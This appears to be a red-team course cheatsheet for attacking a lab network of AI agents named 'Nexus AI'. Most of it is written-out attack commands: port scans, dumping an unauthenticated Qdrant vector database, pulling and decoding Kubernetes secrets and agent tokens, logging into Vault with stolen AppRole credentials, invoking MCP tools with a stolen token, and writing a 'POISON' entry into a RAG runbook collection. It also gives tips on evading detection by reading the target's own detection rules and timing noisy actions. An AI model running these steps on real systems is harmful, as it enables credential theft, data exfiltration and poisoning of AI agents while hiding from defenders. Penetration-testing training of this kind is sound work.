# Module 10 Cheatsheet — Threat Modeling for AI-Enabled Targets

## Engagement Flow
1. Passive OSINT → form assumption register (MEDIUM confidence, UNVALIDATED)
2. Active recon → validate/invalidate assumptions
3. Extract detection rules from target's own vector DB → OPSEC intelligence
4. Rank crown jewels by trust boundary depth
5. Map validated components to ATLAS technique IDs
6. Execute lowest-noise actions first; time high-noise for maintenance windows

## Key Commands

```bash
# Network discovery
nmap -sV -p- --open -T4 10.10.50.0/24
nmap -sV -p 9000-9005,6333,5000,8200,16333 10.10.50.0/24   # targeted

# MCP tool surface (find hidden tools not in OSINT)
curl -s http://<MCP>:9005/tools | jq '.tools[] | {name, description}'

# Qdrant auth check + collection listing
curl -s http://<QDRANT>:6333/collections | jq '.result.collections[].name'

# Qdrant — extract ALL points (detection rules, runbooks, etc.)
curl -s http://<QDRANT>:6333/collections/detection_rules/points/scroll \
  -X POST -H "Content-Type: application/json" \
  -d '{"limit": 100, "with_payload": true, "with_vector": false}' | jq '.'

# Qdrant — filtered search by category
curl -s http://<QDRANT>:6333/collections/<name>/points/scroll \
  -X POST -H "Content-Type: application/json" \
  -d '{"limit": 50, "with_payload": true, "filter": {"must": [{"key": "category", "match": {"value": "runbook"}}]}}' | jq '.'

# K8s — list all secrets, extract and decode agent tokens
kubectl --token=$K8S_TOKEN get secrets -n nexus-ai \
  -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}'
kubectl --token=$K8S_TOKEN get secret nexus-remediation-agent-token -n nexus-ai \
  -o jsonpath='{.data.token}' | base64 -d
kubectl --token=$K8S_TOKEN get secret nexus-mcp-vault-approle -n nexus-ai \
  -o json | jq '.data | map_values(@base64d)'

# Decode JWT (agent scope claims)
echo "<TOKEN>" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '{agent, scope}'

# Vault — AppRole login → get token
curl -s http://<VAULT>:8200/v1/auth/approle/login \
  -X POST -d '{"role_id": "<ID>", "secret_id": "<SECRET>"}' | jq '.auth.client_token'

# Vault — read secret
curl -s http://<VAULT>:8200/v1/secret/data/nexus/aws \
  -H "X-Vault-Token: <TOKEN>" | jq '.data.data'

# MCP — invoke tool with remediation token (test_canary first)
curl -s http://<MCP>:9005/invoke -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <REMEDIATION_TOKEN>" \
  -d '{"tool": "vault_rotate_secret", "params": {"secret_path": "secret/nexus/test_canary"}}'

# MCP — aws_cli_exec (starts 24hr reporting clock — use last)
curl -s http://<MCP>:9005/invoke -X POST \
  -H "Authorization: Bearer <REMEDIATION_TOKEN>" \
  -d '{"tool": "aws_cli_exec", "params": {"command": "sts get-caller-identity", "region": "us-east-1"}}'

# Staging Qdrant write (RoE permits :16333)
curl -s http://<QDRANT>:16333/collections/<name>/points \
  -X PUT -H "Content-Type: application/json" \
  -d '{"points": [{"id": 9999, "vector": [...], "payload": {"content": "POISON", "category": "runbook"}}]}'
```

## Nexus AI Service Map
| IP | Port | Service | Auth | Status |
|----|------|---------|------|--------|
| 10.10.50.10 | 9000 | Orchestrator | mTLS | Central router |
| 10.10.50.11 | 9001 | Triage Agent | mTLS | scope: snow_create_ticket, datadog_query |
| 10.10.50.12 | 9002 | Remediation Agent | mTLS | scope: vault_rotate_secret |
| 10.10.50.13 | 9003 | Security Agent | mTLS | scope: unknown |
| 10.10.50.14 | 9004 | Knowledge Agent | mTLS | RAG provider |
| 10.10.50.15 | 9005 | MCP Server | JWT | vault_rotate_secret, aws_cli_exec |
| 10.10.50.20 | 6333 | Qdrant (prod) | **NONE** | Read/write open |
| 10.10.50.20 | 16333 | Qdrant (staging) | **NONE** | Write per RoE |
| 10.10.50.21 | 5000 | MLflow | Unknown | Model registry |
| 10.10.50.22 | 8200 | Vault | AppRole | AppRole creds in K8s |

## OPSEC Noise Quick Reference
| Action | Noise | Mitigation |
|--------|-------|------------|
| `nmap -T4` full scan | HIGH | Use `-T2`; targeted ports |
| Qdrant bulk read from attack host | MEDIUM | Route via pod IP (`kubectl exec`) |
| `vault_rotate_secret` outside maint. window | HIGH | Wait for maintenance window |
| `vault_rotate_secret` in maint. window | LOW | Go time |
| `aws_cli_exec` (any) | HIGH | Use last; STS/SSM before IAM |
| Direct agent-to-agent | HIGH | Route through Orchestrator always |
| Staging Qdrant write `:16333` | LOW | Permitted per RoE |
| K8s secret read | LOW | Expected grey-box activity |

## MITRE ATLAS IDs — Quick Lookup
| ID | Technique | Status |
|----|-----------|--------|
| AML.T0020 | Poison Training Data | Actionable (staging Qdrant) |
| AML.T0025 | Exfiltration via Cyber Means | Actionable (Qdrant unauth) |
| AML.T0040 | Inference API Access | Actionable (agent endpoints) |
| AML.T0043 | Craft Adversarial Data | Precondition: TB-1 auth |
| AML.T0044 | ML Model Access | Precondition: MLflow auth |
| AML.T0085 | Data from AI Services | Actionable (remediation token) |
| AML.T0010 | AI Supply Chain Compromise | Precondition: MLflow write |

## ⚠️ Weak Areas [PRIORITISE]
- Assumption register lifecycle — OSINT = MEDIUM/UNVALIDATED, not VALIDATED
- ATLAS precondition requirement — technique IDs only applied after component validation
- Detection rule extraction timing — do this BEFORE taking noisy actions

## Remember
- OSINT is never VALIDATED — always MEDIUM confidence until actively confirmed
- Extract target's own detection rules first — they tell you exactly what to avoid
- `aws_cli_exec` starts a 24hr reporting clock — use it last
- Vault AppRole in K8s = direct Vault access bypassing MCP entirely (TB-4/TB-5 skipped)
- `vault_rotate_secret` = maintenance window only (rule: `nexus-mcp-002`)
